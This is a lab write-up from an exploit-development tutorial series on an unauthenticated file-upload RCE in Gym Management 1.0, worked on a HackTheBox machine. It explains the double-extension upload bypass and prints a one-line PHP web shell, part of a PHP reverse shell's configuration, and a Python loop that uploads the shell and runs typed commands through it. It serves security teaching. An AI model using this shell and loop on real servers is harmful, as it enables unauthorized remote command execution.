# ExploitDev Journey #5 | Gym Management 1.0 unauthenticated RCE
Original Exploit: https://www.exploit-db.com/exploits/48506 <br>


**Exploit name:** Gym Management 1.0 unauthenticated RCE  <br>
**CVE**: N\\A <br>
**Lab**: Buff - HackTheBox

### Description
There is an unrestricted image upload path within Gym management 1.0 web app that allows unauthenticated users to upload files. The functionality also suffer from a misconfiguration that allows as to upload PHP shells by using the [double extension file upload bypass](https://book.hacktricks.xyz/pentesting-web/file-upload).

<br>

### How it works
The path to upload files is `http://target.htb/upload.php?id=shell.php` and it's unrestricted, this allows anyone to upload files. But the bad thing is that there isn't enough restrictions of whitelisting/blacklisting against the type of files you can upload. I guess this is the path where admins can upload whatever they want so they don't really thought about protecting it, but leaving it unrestricted allows people to upload things, whether malicious or not. <br>
In order to upload a php file, all you have to do is to add two extensions to the file name, like this: `file_name.php.jpg`
Here the JPEG file extension is allowed but PHP isn't, but the application only reads the last extension which is `.jpg` and from there it assumes that your file is a harmless image, but when the file is stored on the server, it will be stored with the first extension which is `.php` and not `.jpg`.

<br>

### Writing the exploit
Writing the exploit is very easy but there is one little detail here, remember that in exploit development session of `CVE-2019-16113` I used a [PHP reverse shell from PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)?
Here we can't use that, we just can't upload it because that reverse shell only works on Linux systems. Look at these variables at the beginning of that shell:
```php
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

The `$shell` variable indicates that linux commands separated by semicolons are being used.

> `shell = '<?php echo shell_exec($_GET["rce"]); ?>'`

Here as you can see I am creating a GET parameter named `rce` and I am also using `echo` for printing and `shell_exec` for executing system commands. By uploading this shell, you can execute system commands from your browser like this:
<img src="https://i.ibb.co/tB1VqWb/buff1.png">

But I have automated all of these operations so you won't have to open your browser.
<br>
By now you already understand most of what's going on, given that you have followed the ExploitDev journey step by step. However I would still like to highlight something inside the try:except clause.

> `upload(target)`

Here is the part that I would like to explain (partially):
```py
try:
    upload = session.post(url=upload_path, files=file, data=data, verify=False, timeout=30)
    if upload.status_code != 200:
        sys.exit(f"Uploading {shell_name} failed, exiting.")
    else:
        print(f"Shell has been uploaded: {uploaded}")
        print(70 * '-')
        while True:
            try:
                params = {'rce': input("Shell> ")}
                command = session.get(url=uploaded, params=params, verify=False, timeout=30)
                print(command.text)
            except requests.exception.Timeout:
                sys.exit(f"[ - ] Timeout error, unable to connect to {target}")
except requests.exception.Timeout:
    sys.exit(f"[ - ] Timeout error, unable to connect to {target}")
```

The `while` statement and the block of code inside it are new topics. Remember that uploading a shell that's specific to one operating system often causes misery and failure but uploading a shell that's kind of universal and independent of the operating system always works. For example `shell_exec` function is independent of operating system running on the target and is just a function of PHP that works anywhere PHP is running.

I created an infinite while loop that allows you to interact with the shell and whenever you execute a system command, you send out a new request. Let's take a close look into `params` variable:
```py
params = {'rce': input("Shell> ")}
```

Earlier I explained that our `shell` variable contains PHP code that creates a parameter named RCE and uses `echo` and `shell_exec` to execute system commands and print their output. The way we use parameters in Python is just shown in the above code. `rce` is the name of your parameter, it's value is taken from keyboard input.
Take a look here one more time and you will understand:
```
http://10.129.112.165:8080/upload/oBWTPlSolx.php?rce=whoami
```

Instead of using the `input()` function, you can use plaintext as well but using `input()` especially with a string inside to prettify it makes it more convenient to use. After sending GET request along with the parameters, then you print out the results.

Here is how it looks like when executed:<br>
<img src="https://i.ibb.co/YbxwKm9/buff2.png">

Remember that we used `echo` which is a function in PHP used for printing data, here we print that inside the web application and grab the results with `print(command.text)`. <br>
Notice that `ls` is not a windows command and it doesn't return anything.


### Final thoughts
In this exploit development session you learned about using PHP shells that are kind of universal and work wherever PHP is running, they are independent of the operating system and they work most of the time. You also learned about beautifying the way you capture user's input to make it more convenient to use.

